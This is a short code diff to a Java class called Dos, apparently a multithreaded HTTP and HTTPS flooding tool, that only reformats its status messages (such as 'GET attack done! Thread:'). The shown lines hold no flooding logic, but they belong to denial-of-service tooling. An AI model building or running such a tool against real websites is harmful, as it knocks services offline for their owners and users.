@@ -132,7 +132,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode, "Connected to website");
+        printStatus(responseCode + " Connected to website");
         Dos.url = url;
     }
 
@@ -144,7 +144,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode, "Connected to website");
+        printStatus(responseCode + " Connected to website");
         Dos.url = url;
     }
 
@@ -155,7 +155,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode, "GET attack done! Thread: " + this.seq);
+        printStatus(responseCode + " GET attack done! Thread: " + this.seq);
     }
 
     private void sslGetAttack(String url) throws Exception {
@@ -165,7 +165,7 @@ public class Dos implements Runnable {
         con.setRequestProperty("User-Agent", USER_AGENT);
 
         int responseCode = con.getResponseCode();
-        printStatus(responseCode, "SSL GET attack done! Thread: " + this.seq);
+        printStatus(responseCode + "SSL GET attack done! Thread: " + this.seq);
     }
 
     private HttpURLConnection createHttpURLConnection(URL url) throws IOException {
